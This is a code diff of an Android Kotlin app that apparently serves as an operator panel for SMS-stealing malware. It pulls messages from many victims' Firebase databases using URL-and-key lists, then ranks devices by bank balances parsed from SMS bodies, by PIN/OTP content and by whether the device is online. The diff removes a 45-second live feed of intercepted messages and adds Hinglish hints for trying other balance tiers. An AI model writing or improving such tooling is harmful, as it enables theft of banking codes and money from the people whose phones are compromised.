@@ -23,13 +23,10 @@ import com.firebasepanel.sms.domain.mainBalanceForSort
 import com.firebasepanel.sms.domain.messageHasPinText
 import com.firebasepanel.sms.domain.messageWithinDays
 import com.firebasepanel.sms.domain.passesInboxMode
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.delay
 import kotlinx.coroutines.flow.MutableStateFlow
 import kotlinx.coroutines.flow.StateFlow
 import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
-import kotlinx.coroutines.isActive
 import kotlinx.coroutines.launch
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -97,18 +94,6 @@ data class SmsRow(
     val kindLabel: String,
 )
 
-/** Compact row for dashboard live SMS strip (all filtered devices). */
-data class LiveSmsRow(
-    val deviceId: String,
-    val firebaseUrl: String,
-    val sender: String,
-    val body: String,
-    val balance: Double?,
-    val messageAtMillis: Long?,
-    val online: Boolean,
-    val kindLabel: String,
-)
-
 data class UiState(
     val urlsLoaded: Int = 0,
     val fetching: Boolean = false,
@@ -118,18 +103,15 @@ data class UiState(
     val lastFetchTotalSms: Int = 0,
     /** When filters hide everything but SMS loaded — short hint for user. */
     val filterEmptyHint: String? = null,
-    val autoLiveRefresh: Boolean = false,
     val devices: List<DeviceRow> = emptyList(),
     val selected: DeviceDetail? = null,
     val error: String? = null,
     val searchQuery: String = "",
-    val liveFeedSms: List<LiveSmsRow> = emptyList(),
     val config: FilterConfig =
         FilterConfig(
             sortMode = SortMode.HIGH_TO_LOW,
             pinFilter = PinFilter.BOTH,
-            /** Both = show panels even when HTTP reports offline (many DBs still have SMS). */
-            connection = ConnectionFilter.BOTH,
+            connection = ConnectionFilter.ONLINE,
             days = null,
             inboxMode = InboxMode.BANK_FILTERED,
             balanceTier = BalanceTier.HIGH_1L_20L,
@@ -143,8 +125,6 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
 
     private var lastResults: List<FetchResult> = emptyList()
     private var storedPanels: List<FirebasePanel> = emptyList()
-    private var liveJob: Job? = null
-
     fun updateConfig(block: (FilterConfig) -> FilterConfig) {
         _state.update { it.copy(config = block(it.config)) }
         applyFilters()
@@ -153,25 +133,6 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     fun setSearchQuery(q: String) {
         _state.update { it.copy(searchQuery = q) }
         applyFilters()
-    }
-
-    fun setInboxMode(mode: InboxMode) {
-        _state.update { it.copy(config = it.config.copy(inboxMode = mode)) }
-        applyFilters()
-    }
-
-    fun setAutoLiveRefresh(enabled: Boolean) {
-        _state.update { it.copy(autoLiveRefresh = enabled) }
-        liveJob?.cancel()
-        if (enabled && storedPanels.isNotEmpty()) {
-            liveJob =
-                viewModelScope.launch {
-                    while (isActive) {
-                        delay(45_000L)
-                        fetchAndCompute(storedPanels)
-                    }
-                }
-        }
     }
 
     fun loadUrlsFromTxt(context: Context, uri: Uri) {
@@ -198,10 +159,9 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                             buildString {
                                 append("Ready: ${panels.size} panels")
                                 if (withoutKey > 0) append(" — ⚠️ $withoutKey bina Auth Key (Virtus format: URL + KEY lines)")
-                                append(" — Start Fetch / Fetch Live")
+                                append(" — Start Fetch")
                             },
                         devices = emptyList(),
-                        liveFeedSms = emptyList(),
                         selected = null,
                         lastFetchEpochMs = 0L,
                         lastFetchTotalSms = 0,
@@ -228,7 +188,6 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                 fetching = true,
                 progress = "Fetching ${panels.size} panels (clients + messages)…",
                 devices = emptyList(),
-                liveFeedSms = emptyList(),
                 selected = null,
                 filterEmptyHint = null,
                 error = null,
@@ -239,6 +198,7 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
         val totalSms = results.sumOf { it.sms.size }
         val panelsHit = results.count { it.sms.isNotEmpty() }
         val authHits = results.count { it.usedAuth }
+        val firstErr = results.mapNotNull { it.error }.firstOrNull()
         _state.update {
             it.copy(
                 fetching = false,
@@ -251,6 +211,12 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
                     },
                 lastFetchEpochMs = System.currentTimeMillis(),
                 lastFetchTotalSms = totalSms,
+                error =
+                    if (totalSms == 0 && firstErr != null) {
+                        "Koi SMS nahi mila: $firstErr — KEY check karo, ya agla panel."
+                    } else {
+                        null
+                    },
             )
         }
         applyFilters()
@@ -260,17 +226,16 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
         val cfg = _state.value.config
         val q = _state.value.searchQuery.trim().lowercase()
         val devices = buildDeviceList(lastResults, cfg, q)
-        val liveFeed = buildLiveFeedList(lastResults, cfg, q)
         val totalSms = lastResults.sumOf { it.sms.size }
         val hint =
-            if (totalSms > 0 && devices.isEmpty() && liveFeed.isEmpty() && q.isEmpty()) {
-                "Firebase se $totalSms SMS aaye, lekin filters sab hide kar rahe — " +
-                    "Connection → Both, Mode → Full inbox, ya SMS age → All try karo."
+            if (totalSms > 0 && devices.isEmpty() && q.isEmpty()) {
+                "Firebase se $totalSms SMS aaye, lekin is tier/PIN/connection me kuch match nahi — " +
+                    "dusra band (Medium / Low→High) try karo, PIN \"No PIN\" ya connection Offline, SMS age All."
             } else {
                 null
             }
         _state.update {
-            it.copy(devices = devices, liveFeedSms = liveFeed, selected = null, filterEmptyHint = hint)
+            it.copy(devices = devices, selected = null, filterEmptyHint = hint)
         }
     }
 
@@ -313,7 +278,6 @@ class PanelViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     override fun onCleared() {
-        liveJob?.cancel()
         super.onCleared()
     }
 }
@@ -532,48 +496,6 @@ private fun buildDeviceList(
             }
         else -> rows.sortedByDescending { it.lastActivityMillis }
     }
-}
-
-/** Recent SMS across all devices that pass filters + search (for live strip). */
-private fun buildLiveFeedList(
-    results: List<FetchResult>,
-    cfg: FilterConfig,
-    searchQuery: String,
-    cap: Int = 60,
-): List<LiveSmsRow> {
-    val q = searchQuery.trim().lowercase()
-    val out = mutableListOf<LiveSmsRow>()
-    val label = smsKindLabel(cfg)
-    for (fr in results) {
-        val byDev = fr.sms.groupBy { deviceIdFromPath(it.rawPath) }
-        for ((devId, msgs) in byDev) {
-            val snap = fr.devices[devId]
-            val lastMsgAny = msgs.maxOfOrNull { it.messageAtMillis ?: 0L }?.takeIf { it > 0L }
-            val deviceOnline = resolveDeviceOnline(snap, fr, lastMsgAny)
-            if (!connectionOk(deviceOnline, cfg.connection)) continue
-            val devicePin = deviceHasPinResolved(msgs, snap)
-            if (!pinOkForDevice(devicePin, cfg.pinFilter, cfg.inboxMode)) continue
-            if (!matchesSearch(devId, fr.url, msgs, snap, q)) continue
-            val filtered = filterSmsList(msgs, cfg)
-            for (sms in filtered) {
-                out.add(
-                    LiveSmsRow(
-                        deviceId = devId,
-                        firebaseUrl = fr.url,
-                        sender = sms.sender.ifBlank { "(unknown)" },
-                        body = sms.body,
-                        balance = mainBalanceForSort(sms.body),
-                        messageAtMillis = sms.messageAtMillis,
-                        online = deviceOnline,
-                        kindLabel = label,
-                    ),
-                )
-            }
-        }
-    }
-    return out
-        .sortedByDescending { it.messageAtMillis ?: 0L }
-        .take(cap)
 }
 
 private fun buildDeviceDetail(results: List<FetchResult>, row: DeviceRow, cfg: FilterConfig): DeviceDetail? {
